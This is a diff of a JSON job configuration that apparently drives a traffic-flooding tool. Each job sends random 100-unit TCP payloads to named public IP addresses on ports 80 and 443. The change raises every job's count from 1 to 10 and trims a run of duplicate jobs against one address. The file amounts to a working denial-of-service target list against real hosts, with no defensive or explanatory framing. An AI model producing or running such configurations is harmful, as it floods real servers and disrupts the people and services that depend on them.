@@ -2,7 +2,7 @@
   "jobs": [
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "185.165.123.70:80",
         "body": "{{ random_payload 100 }}"
@@ -10,7 +10,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "185.165.123.70:443",
         "body": "{{ random_payload 100 }}"
@@ -18,7 +18,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "185.165.123.97:80",
         "body": "{{ random_payload 100 }}"
@@ -26,7 +26,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "185.165.123.97:443",
         "body": "{{ random_payload 100 }}"
@@ -34,7 +34,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.7:443",
         "body": "{{ random_payload 100 }}"
@@ -42,7 +42,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.7:80",
         "body": "{{ random_payload 100 }}"
@@ -50,7 +50,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.27:80",
         "body": "{{ random_payload 100 }}"
@@ -58,7 +58,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.27:443",
         "body": "{{ random_payload 100 }}"
@@ -66,7 +66,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.6:443",
         "body": "{{ random_payload 100 }}"
@@ -74,7 +74,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.6:80",
         "body": "{{ random_payload 100 }}"
@@ -82,7 +82,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.26:80",
         "body": "{{ random_payload 100 }}"
@@ -90,7 +90,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "151.236.114.26:443",
         "body": "{{ random_payload 100 }}"
@@ -98,7 +98,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "91.232.93.70:443",
         "body": "{{ random_payload 100 }}"
@@ -106,7 +106,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "91.232.93.70:80",
         "body": "{{ random_payload 100 }}"
@@ -114,7 +114,7 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "213.5.80.180:80",
         "body": "{{ random_payload 100 }}"
@@ -122,249 +122,9 @@
     },
     {
       "type": "tcp",
-      "count": 1,
+      "count": 10,
       "args": {
         "address": "213.5.80.180:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 1,
-      "args": {
-        "address": "185.165.123.70:443",
         "body": "{{ random_payload 100 }}"
       }
     }
